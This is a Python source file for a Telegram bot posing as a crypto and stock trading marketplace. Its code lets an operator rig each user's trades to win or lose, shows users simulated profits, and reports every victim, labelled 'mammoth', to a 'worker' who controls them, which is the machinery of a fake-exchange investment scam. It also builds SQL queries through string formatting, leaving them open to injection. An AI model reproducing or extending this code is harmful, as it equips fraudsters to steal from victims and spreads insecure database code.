import asyncio
import random

from aiogram import Bot
from aiogram.types import Message, FSInputFile, CallbackQuery
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.context import FSMContext

from core.utils.sqlite_db import cursor, conn, User
from core.keyboards.marketplace_kb import *
from core.keyboards.worker_kb import *
from core.utils.converter import *


class PositionStates(StatesGroup):
    setting_amount = State()


async def callback_marketplace_menu(callback: CallbackQuery, callback_data: MenuCallback):
    user = User.get_user(callback.from_user.id)

    if callback_data.action == "faq":
        caption = get_translate("faq", user.language)
        await callback.message.edit_caption(caption=caption, reply_markup=get_marketplace_faq_kb())
    elif callback_data.action == "cryptocurrency":
        caption = get_translate("cryptocurrencies_caption", user.language)
        await callback.message.edit_caption(caption=caption, reply_markup=get_marketplace_crypto_kb())
    elif callback_data.action == "company_shares":
        caption = get_translate("company_shares_caption", user.language)
        await callback.message.edit_caption(caption=caption, reply_markup=get_marketplace_stocks_kb())


previous_currency_values = {}


async def callback_marketplace_assets(callback: CallbackQuery, callback_data: MenuCallback):
    user = User.get_user(callback.from_user.id)

    asset = callback_data.action
    current_currency_value = await convert_currency(asset, user.currency)

    if previous_currency_values.get(asset) is None:
        previous_currency_values[asset] = current_currency_value

    last_change = current_currency_value - previous_currency_values[asset]
    market_movement_percent = (last_change / previous_currency_values[asset]) * 100

    caption = get_translate("asset_info", user.language).format(asset=asset,
                                                                price=current_currency_value,
                                                                currency=user.currency,
                                                                market_movement=round(market_movement_percent, 4),
                                                                last_change=round(last_change, 4))
    try:
        await callback.message.edit_caption(caption=caption,
                                            reply_markup=get_asset_action_kb(asset))
    except Exception:
        pass
    if previous_currency_values[asset] != current_currency_value:
        previous_currency_values[asset] = current_currency_value


min_position = 1

async def callback_asset_action(callback: CallbackQuery, callback_data: AssetActionCallback, state: FSMContext):
    user = User.get_user(callback.from_user.id)

    exchange_rate = await convert_currency("USD", user.currency)
    caption = get_translate("action_caption", user.language).format(asset=callback_data.asset,
                                                                    action=callback_data.action,
                                                                    balance=round(user.balance * exchange_rate,4),
                                                                    currency=user.currency,
                                                                    min_position=min_position * exchange_rate)
    await state.update_data(callback=callback, asset=callback_data.asset, action=callback_data.action)
    await state.set_state(PositionStates.setting_amount)
    await callback.message.edit_caption(caption=caption, reply_markup=get_asset_action_back_kb(callback_data.asset))


async def get_asset_position(msg: Message, state: FSMContext):
    user = User.get_user(msg.from_user.id)

    exchange_rate_user_currency = await convert_currency("USD", user.currency)
    exchange_rate_usd = await convert_currency(user.currency, "USD")

    user_data = await state.get_data()
    callback = user_data["callback"]
    asset = user_data["asset"]
    action = user_data["action"]

    try:
        amount = float(msg.text) * exchange_rate_usd
        amount_user_currency = float(msg.text)
        if amount <= min_position:
            raise Exception(get_translate("error_min_amount", user.language).format
                            (min_amount=exchange_rate_user_currency * min_position, currency=user.currency))
        if amount > user.balance:
            raise Exception(get_translate("error_over_balance", user.language))
        await state.clear()
        caption = get_translate("position_time", user.language)
        await callback.message.edit_caption(caption=caption,
                                            reply_markup=get_asset_action_time_kb(asset, action, amount_user_currency))
    except ValueError:
        await msg.answer(get_translate("invalid_input", user.language))
    except Exception as e:
        await msg.answer(str(e))
    await msg.delete()


def get_strategy_factor(strategy, action):
    if strategy == "random":
        return random.uniform(0.995, 1.005)
    elif strategy == "real":
        return 1.0
    if action == "long":
        if strategy == "loss":
            return random.uniform(0.99, 1.00)
        elif strategy == "win":
            return random.uniform(1.00, 1.01)
    elif action == "short":
        if strategy == "loss":
            return random.uniform(1.00, 1.01)
        elif strategy == "win":
            return random.uniform(0.99, 1.00)


async def callback_process_position(callback: CallbackQuery, callback_data: PositionData, bot: Bot):
    user = User.get_user(callback.from_user.id)

    asset = callback_data.asset
    action = callback_data.action
    amount_user_currency = callback_data.amount
    duration = callback_data.duration

    exchange_rate_usd = await convert_to_usd(user.currency)
    exchange_rate_user_currency = await convert_currency("USD", user.currency)
    cursor.execute(
        f"INSERT INTO transactions(user_id,amount, asset, duration, made) "
        f"VALUES{user.id, amount_user_currency * exchange_rate_usd, asset, duration, False}")
    transaction_id = cursor.lastrowid
    conn.commit()
    start_price = await convert_currency(asset, "USD")
    remain_duration = duration

    previous_price = start_price
    while remain_duration >= 0:
        try:
            current_price = await convert_currency(asset, "USD")
            current_price *= get_strategy_factor(user.marketplace_strategy, action)

            last_change = current_price - previous_price
            market_movement = (last_change / previous_price) * 100

            caption = get_translate("position_opened", user.language).format(action=action,
                                                                        position_name=asset,
                                                                        amount=amount_user_currency,
                                                                        currency=user.currency,
                                                                        price=round(current_price * exchange_rate_user_currency, 4),
                                                                        market_movement=round(market_movement, 4),
                                                                        last_change=round(last_change * exchange_rate_user_currency,4),
                                                                        start_price=round(start_price * exchange_rate_user_currency,4))
            await callback.message.edit_caption(caption=caption,
                                                reply_markup=None)
            previous_price = current_price

            await asyncio.sleep(1)
            remain_duration -= 1
        except:
            await asyncio.sleep(1)
            remain_duration -= 1

    end_price = await convert_currency(asset, "USD")
    end_price *= get_strategy_factor(user.marketplace_strategy, action)
    price_change = (end_price - start_price) / start_price
    profit = price_change * (amount_user_currency * exchange_rate_usd) * 100
    if action == "short":
        profit = -profit

    caption = get_translate("position_closed", user.language).format(action=action,
                                                                position_name=asset,
                                                                amount=amount_user_currency,
                                                                currency=user.currency,
                                                                price=round(end_price * exchange_rate_user_currency,4),
                                                                market_movement=round(price_change * exchange_rate_user_currency,4),
                                                                general_change=round((end_price - start_price) * exchange_rate_user_currency,4),
                                                                profit=round(profit * exchange_rate_user_currency, 4),
                                                                start_price=round(start_price * exchange_rate_user_currency,4))

    cursor.execute(f"UPDATE users SET balance = {user.balance + profit}"
                   f" WHERE id={user.id}")
    cursor.execute(f"UPDATE transactions SET profit = {profit}, made={True}"
                   f" WHERE id={transaction_id}")
    conn.commit()
    await callback.message.edit_caption(caption=caption,
                                        reply_markup=get_asset_action_back_kb(asset))

    if user.referrer != 0:
        worker = User.get_user(user.referrer)
        worker_caption = get_translate("mammoth_position", worker.language).format(
                                                        amount=amount_user_currency,
                                                        username=user.username,
                                                        id=user.id,
                                                        currency=user.currency,
                                                        profit=round(profit * exchange_rate_user_currency, 4),
                                                        balance=round((user.balance + profit) * exchange_rate_user_currency,4),
                                                        action=action,
                                                        asset=asset,
                                                        duration=duration)
        await bot.send_message(worker.id, worker_caption,reply_markup=get_control_mammoth_kb(user.id))
